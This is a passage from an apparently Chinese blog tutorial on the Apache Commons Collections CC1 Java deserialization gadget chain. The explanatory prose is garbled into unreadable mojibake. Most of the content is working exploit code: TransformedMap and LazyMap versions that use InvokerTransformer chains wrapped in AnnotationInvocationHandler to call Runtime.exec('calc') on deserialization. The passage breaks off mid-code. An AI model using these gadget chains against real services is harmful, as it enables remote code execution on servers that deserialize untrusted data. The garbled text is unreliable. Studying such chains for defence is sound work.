æ˜¯è·å–æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°</font>ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æœ‰å¯¹åº”çš„åç§°ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807650.png"></p><p>ç‚¹è¿› <font style="color:#080808;background-color:#ffffff;">Overrideï¼Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ³¨è§£æ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011720823.png"></p><p>è€Œç‚¹è¿› <font style="color:#080808;background-color:#ffffff;">Target å‘ç°å…¶ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807151.png"></p><p>ä¿®æ”¹POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//ä¿®æ”¹å‚æ•°</span><br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//æ”¹ä¼ å‚æ³¨è§£ä¸ºï¼šTarget</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™æ—¶ <font style="color:#080808;background-color:#ffffff;">memberType å·²ç»ä¸ä¸ºç©ºäº†ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808790.png"></p><ol start="3"><li><code>setValue</code> ä¼ å‚å›ºå®š</li></ol><p>ç»§ç»­è·Ÿè¿›æ—¶ï¼Œå‘ç°<code>setValue</code> ä¼ å…¥çš„å€¼ä¸æ˜¯ Runtime.class ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808526.png"></p><p>è¿™é‡Œå°±éœ€è¦ <code>ConstantTransformer</code> ç±»ï¼Œ<code>ConstantTransformer</code> æ–¹æ³•å°†ä¼ å…¥çš„å¯¹è±¡æ”¾å…¥ <code>iConstant</code>ä¸­ï¼Œ<code>transform()</code> æ–¹æ³•æ— è®ºä¼ å…¥ä»€ä¹ˆï¼Œéƒ½è¿”å› <code>iConstant</code>ï¼Œå®Œç¾ç¬¦åˆè¦æ±‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808248.png"></p><p>ä¿®æ”¹POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//æ·»åŠ ï¼š</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-æœ€ç»ˆ-POC-ï¼š"><a href="#1-4-æœ€ç»ˆ-POC-ï¼š" class="headerlink" title="1.4 æœ€ç»ˆ POC ï¼š"></a>1.4 æœ€ç»ˆ POC ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808016.png"></p><h3 id="1-5-æ€»ç»“"><a href="#1-5-æ€»ç»“" class="headerlink" title="1.5 æ€»ç»“"></a>1.5 æ€»ç»“</h3><p><code>transform</code> æ–¹æ³•ï¼Œå¯ä»¥æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ï¼Œ ä½†æ˜¯ï¼Œåœ¨å®ç°ç±»é‡ŒæŠŠ <code>transform</code> å˜æˆâ€œå¯ä»¥æ‰§è¡Œä»»æ„é€»è¾‘â€æ—¶ï¼Œå°±å‡ºç°äº†æ¼æ´ã€‚æˆ‘ä»¬å‘ç° <code>InvokerTransformer</code> å®ç°äº† <code>Transformer</code> æ¥å£å¹¶ä¸”æœ‰ <code>transform</code> æ–¹æ³•ï¼Œ</p><p>æ¥ç€æ‰¾åˆ° <code>TransformedMap</code> ç±»ä¸­çš„ <code>checkSetValue</code> æ–¹æ³•è°ƒç”¨äº† <code>transform</code> æ–¹æ³•ï¼›</p><p>ä¹‹åæ‰¾åˆ° <code>AbstractInputCheckedMapDecorator</code> ç±»ä¸­çš„ <code>setValue</code> æ–¹æ³•è°ƒç”¨äº† <code>checkSetValue</code>æ–¹æ³•ï¼Œ</p><p>é€šè¿‡æµ‹è¯•è¿™æ¡é“¾æ˜¯æ²¡é—®é¢˜çš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªå…¥å£ç‚¹ ï¼ŒæŸ¥æ‰¾å“ªä¸ªæ–¹æ³•è°ƒç”¨äº† <code>setValue</code> ï¼Œæœ€å¥½æ˜¯é‡å†™çš„ <code>readObject</code>ï¼Œé€šè¿‡ <code>readObject</code> æ¥è§¦å‘æ¼æ´ã€‚</p><p>æ‰¾åˆ° <code>AnnotationInvocationHandler</code> ç±»ä¸­çš„ <code>readObject</code> æ–¹æ³•å­˜åœ¨ <code>setValue</code>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ <code>readObject</code> ä¸æ˜¯ç›´æ¥è°ƒç”¨ Â·ï¼Œ</p><p><code>readObject</code> æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šä»åºåˆ—åŒ–æ•°æ®ä¸­æ¢å¤ <code>memberValues</code>ï¼ˆä¸€ä¸ª <code>Map</code>ï¼‰ï¼Œè€Œè¿™ä¸ª <code>Map</code> çš„å†…å®¹å®Œå…¨å–å†³äºæ”»å‡»è€…ä¼ å…¥çš„åºåˆ—åŒ–æµã€‚æ”»å‡»è€…å¯ä»¥åœ¨è¿™é‡Œæ›¿æ¢æˆ <code>TransformedMap</code>ï¼Œä»è€ŒæŠŠæ¶æ„ <code>Transformer</code> é“¾æ¥è¿›æ¥ã€‚</p><p>é€šè¿‡å¯¹ <code>readObject</code> çš„è°ƒè¯•ï¼ŒçŸ¥é“äº† <code>readObject</code> å¦‚ä½•è§¦å‘ <code>setValue</code> ï¼š</p><p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œ<code>AnnotationInvocationHandler.readObject</code> ä¼šå»æ¢å¤ <code>memberValues</code> é‡Œçš„æ•°æ®ã€‚å®ƒéå† <code>memberValues.entrySet()</code> æ—¶ï¼Œå–åˆ°çš„ <code>MapEntry</code> ä¼šè°ƒç”¨ <code>setValue</code> æ¥å†™å…¥å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šååºåˆ—åŒ–æ—¶ï¼Œ<code>readObject</code> é—´æ¥è§¦å‘äº† <code>MapEntry.setValue</code>ã€‚ </p><p><strong>å®Œæ•´çš„åˆ©ç”¨é“¾æ€è·¯ï¼š</strong></p><p> AnnotationInvocationHandler.readObject</p><p>memberValue.setValue</p><p>MapEntry.setValue</p><p>parent.checkSetValue</p><p>TransformedMap.checkSetValue</p><p>valueTransform.transform</p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808194.png"></p><p><code>readObject</code> åœ¨ååºåˆ—åŒ–æ—¶ä¼šæ¢å¤ <code>memberValues</code>ï¼ˆä¸€ä¸ª <code>Map</code>ï¼‰,</p><p>ç”±äºæ”»å‡»è€…å¯æ§ï¼Œè¿™ä¸ª <code>Map</code> å¯ä»¥è¢«æ›¿æ¢ä¸º <code>TransformedMap</code>ï¼Œ</p><p>å½“ <code>readObject</code> éå† <code>memberValues.entrySet()</code> æ—¶ï¼Œä¼šè§¦å‘ <code>MapEntry.setValue</code>ï¼Œ</p><p><code>setValue</code> ä¼šè°ƒç”¨ <code>checkSetValue</code>ï¼Œè€Œ <code>checkSetValue</code> åˆä¼šè°ƒç”¨ <code>valueTransform.transform</code>ï¼Œ</p><p>è¿™é‡Œçš„ <code>valueTransform</code> å®é™…ä¸Šæ˜¯ <code>ChainedTransformer</code>ï¼Œå®ƒä¼šä¾æ¬¡æ‰§è¡Œå…¶ä¸­çš„ <code>ConstantTransformer</code> å’Œ <code>InvokerTransformer</code>ï¼Œ</p><p>æœ€ç»ˆ <code>InvokerTransformer.transform</code> ä¼šè°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œã€‚</p><h2 id="2ã€-LazyMap-ç‰ˆ"><a href="#2ã€-LazyMap-ç‰ˆ" class="headerlink" title="2ã€ LazyMap ç‰ˆ"></a>2ã€ LazyMap ç‰ˆ</h2><h3 id="2-1-åˆ†æåˆ©ç”¨é“¾"><a href="#2-1-åˆ†æåˆ©ç”¨é“¾" class="headerlink" title="2.1 åˆ†æåˆ©ç”¨é“¾"></a>2.1 åˆ†æåˆ©ç”¨é“¾</h3><p>é¦–å…ˆæ‰¾åˆ° LazyMap ç±»ä¸­çš„ get æ–¹æ³•ä¸­æœ‰ <font style="color:#080808;background-color:#ffffff;">transform æ–¹æ³•ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808665.png"></p><p>æ‰¾ factory ï¼š<font style="color:#080808;background-color:#ffffff;">Transformer</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808064.png"></p><p>ç”±äºæ­¤å¤„çš„æ„é€ æ–¹æ³•åŒæ ·ä¸º protected ï¼Œè¿˜æ˜¯åˆ©ç”¨é™æ€æ–¹æ³• decorate ä¼ å‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808653.png"></p><p>ç»§ç»­æ‰¾è°è°ƒç”¨äº† LayMap.get() </p><p>åœ¨ <font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler ç±»ä¸­çš„ invoke æ–¹æ³•è°ƒç”¨äº† get</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808079.png"></p><p>åŒæ—¶è¿™ä¸ªç±»ä¹Ÿæœ‰ TransformedMap ä¸­ç”¨åˆ°çš„ readObject æ–¹æ³• </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311809084.png"></p><p><font style="color:rgb(44, 62, 80);">è¦è§¦å‘ AnnotationInvocationHander.invokeï¼Œç”¨åˆ°åŠ¨æ€ä»£ç†</font></p><h3 id="2-2-ç¼–å†™-EXP"><a href="#2-2-ç¼–å†™-EXP" class="headerlink" title="2.2 ç¼–å†™ EXP"></a>2.2 ç¼–å†™ EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//é¦–å…ˆç”¨ LazyMap æ›¿æ¢ TransformedMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//å¯¹ sun.reflect.annotation.AnnotationInvocationHandler å¯¹è±¡è¿›è¡Œ Proxy</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„åˆ›å»ºäº†ä¸€ä¸ª AnnotationInvocationHandler å¯¹è±¡ï¼›å®ƒå†…éƒ¨çš„ memberValues æ˜¯ LazyMap</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);<br><br>        <span class="hljs-comment">//åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡ proxyMapï¼Œå½“æœ‰äººå¯¹è¿™ä¸ª proxyMap è°ƒç”¨ Map çš„ä»»æ„æ–¹æ³•ï¼Œä¼šè¿›å…¥ AnnotationInvocationHandler.invoke(...)</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br><br>        <span class="hljs-comment">//å› ä¸º proxyMap è‡ªå·±åºåˆ—åŒ– /ååºåˆ—åŒ–ä¸ä¼šè§¦å‘é“¾å­ï¼›åªæœ‰ AnnotationInvocationHandler çš„ååºåˆ—åŒ–è¿‡ç¨‹æ‰ä¼šå»ä¸»åŠ¨è®¿é—® memberValues</span><br>        <span class="hljs-comment">//æŠŠ proxyMap å¡è¿›ä¸€ä¸ªæ–°çš„ AnnotationInvocationHandler çš„ memberValues å­—æ®µé‡Œï¼Œè®©å®ƒåœ¨ readObject() æ—¶è¢«è°ƒç”¨</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, proxyMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span 